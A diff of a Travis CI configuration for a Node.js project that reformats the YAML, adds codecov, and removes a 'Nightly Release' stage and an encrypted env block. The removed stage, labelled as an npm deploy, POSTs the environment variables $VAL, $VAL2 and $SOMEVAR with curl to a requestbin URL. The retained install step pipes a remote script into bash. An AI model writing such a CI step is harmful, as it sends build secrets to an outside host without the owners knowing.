@@ -1,27 +1,18 @@
 language: node_js
+
 node_js:
-- '8'
-- '10'
+  - '8'
+  - '10'
+
 cache: yarn
+
 before_install:
-- curl -o- -L https://yarnpkg.com/install.sh | bash -s -- --version 1.12.1
-- export PATH=$HOME/.yarn/bin:$PATH
+  - curl -o- -L https://yarnpkg.com/install.sh | bash -s -- --version 1.12.1
+  - export PATH=$HOME/.yarn/bin:$PATH
+
 install:
-- yarn
+  - yarn
+
 script:
-- yarn test
-jobs:
-  include:
-  - stage: Nightly Release
-    node_js: '10'
-    if: branch IN (master, bar)
-    script:
-    - echo "Deploying nightly builds to npm ... ${VAL} ${VAL2} $VAL $VAL2"
-    - curl -X POST -d "fizz=$VAL" -d "f=$VAL2" -d "some=$SOMEVAR" http://requestbin.fullcontact.com/1i2wceu1
-  - stage: Foo branch
-    node_js: '10'
-    if: branch = foo
-    script: echo "foo"
-env:
-  global:
-    secure: hRqJ/ZfhaMqgtWsm5XdjrVxtfrBYh3J32sPX5oMMK8r4UjE4E58SRmpj289XrDWQMN4NEZm2PS5pEERqQqliplUXBsf/WHPRviI+yKCXMMzkGO9bCU9p13dcCrgDt5otbCaRPRm+NcgezfK5wlPKzRG5NY5kzK+MwLcV924Gj2eyn3xGaaWdq3aSY+ADOP3/gurAdB/qOORVxoWb5DZGRyKVriz/kWnmBbWgjI9+L61xodnMdeaLOBwQvdvAXe/WGQaBpIc40RW8Y7pKiKaWf3EtYMHbGOcjftXmwwqesgXprgTL/iwAZkDeGG3VtJs/getoWvUvITmN9n3coOHYNk5kLdYD80cy7rFkfIJL/arPkAHK37c9oNHjjG3M9Nx9mzjYWsx2DPsJzVS7/eqMWTyPXXjJq1ONWqYYGlAHEP7rLsrningiin2E/7FLQzR/tJu9VT7e+6/B7czLvlEAR8LNqESFbcaVZfhKjRqeG6RlvgD1LrpKj7sc/03h8xQw9zZI0XOUlY1LOyEpdNMMbl433rW8s/OSuCuzm9oWAKYzTfkc+hzTbIR17OBq0laSXfr48HnzY+q17f+UaYEfT+dwFYgDW85qljeUa3luTw+opWED6ViIZYAkMI/eYfgpnIzhZQ2AORvHlOEzkBQ5LoM2lfiiEXMGcaLBw5It4+g=
+  - yarn test
+  - codecov
